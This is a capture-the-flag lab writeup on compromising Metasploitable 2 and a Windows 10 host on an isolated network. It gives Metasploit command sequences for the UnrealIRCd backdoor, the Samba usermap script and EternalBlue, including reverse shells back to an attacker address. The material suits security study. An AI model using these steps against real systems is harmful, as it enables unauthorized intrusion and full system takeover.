# CTF Writeup — Metasploitable 2

**Dates:** 30 Apr – 06 May 2026  
**Target IP:** 10.0.2.21 (Metasploitable 2)  
**Attacker IP:** 10.0.2.22 (Kali Linux)  
**Network:** NAT Network  
**Goal:** Gain root access via multiple exploitation paths

> ⚠️ Isolated lab environment. No real systems targeted.

---

## Enumeration

```bash
nmap 10.0.2.21 -sV
# Key open ports:
# 21/tcp  FTP  (vsFTPd 2.3.4)
# 22/tcp  SSH  (OpenSSH 4.7p1)
# 139/445 SMB  (Samba 3.X-4.X)
# 6667    IRC  (UnrealIRCd 3.2.8.1)
```

---

## Exploit 1 — UnrealIRCd Backdoor (CVE-2010-2075)

**Port:** 6667 (IRC)

```bash
msfconsole
search unrealirc
use exploit/unix/irc/unreal_ircd_3281_backdoor

# Method A — Bind shell (attacker connects to target)
show payloads
set payload payload/cmd/unix/bind_perl
options
set RHOSTS 10.0.2.21
set LPORT 5522
exploit

# Method B — Reverse shell (target connects back to attacker)
set payload payload/cmd/unix/reverse
set RHOSTS 10.0.2.21
set LHOST 10.0.2.22
set LPORT 1996
exploit
```

**Result:** Shell obtained as `daemon` user  
**Vulnerability:** UnrealIRCd 3.2.8.1 had a backdoor intentionally inserted into the source code. Triggers on specific AB character sequence in USER command.

---

## Exploit 2 — Samba Usermap Script (CVE-2007-2447)

**Port:** 139/445 (SMB)

```bash
# Verify Samba version
nmap 10.0.2.21 -p 139,445 -sV
# 139/tcp  Samba smbd 3.X - 4.X

msfconsole
search usermap
use exploit/multi/samba/usermap_script
show payloads
set payload payload/cmd/unix/reverse_netcat
options
set RHOSTS 10.0.2.21
set LHOST 10.0.2.22
set LPORT 5599
exploit
```

**Result:** Root shell obtained directly  
**Vulnerability:** Samba 3.0.20–3.0.25rc3 passes unfiltered user input to `/bin/sh` via the `username map script` option.

---

## Exploit 3 — EternalBlue MS17-010 on Windows (CVE-2017-0143)

**Target:** Windows 10 (10.0.2.20)  
**Port:** 445 (SMB)

```bash
# Step 1 — Verify vulnerability
nmap 10.0.2.20 -Pn -n -T4 -p 139,445 -sV --script smb-vuln-*
# Result: Host is VULNERABLE to MS17-010

# Step 2 — SMB enumeration with NSE scripts
find / -name *.nse | grep smb
nmap 10.0.2.20 -Pn -n -T4 -p 139,445 -sV --script smb-os-discovery.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-protocols.nse
nmap 10.0.2.20 -Pn -n -T4 -p 139,445 -sV --script smb-enum-shares.nse --script-args smbusername=forensic,smbpass=admin

# Step 3 — Exploit
msfconsole
search CVE-2017-0143 type:exploit
use exploit/windows/smb/ms17_010_eternalblue
options
set RHOSTS 10.0.2.20
set LPORT 4567
set LHOST 10.0.2.22
set SMBUSER forensic
set SMBPASS admin
exploit

meterpreter> sysinfo
# Result: NT AUTHORITY\SYSTEM — full control
```

**Vulnerability:** SMBv1 buffer overflow used in the 2017 WannaCry ransomware attack.

---

## Key Takeaways

- Multiple services on Metasploitable 2 are independently exploitable — real systems often have one weak point, not many
- Always enumerate before exploiting — Nmap + NSE scripts reveal which path is viable
- Bind vs reverse shells: use reverse when target is behind firewall/NAT
- Samba and IRC backdoors show why open-source software supply chain security matters
- EternalBlue is still found on unpatched systems in real enterprise environments
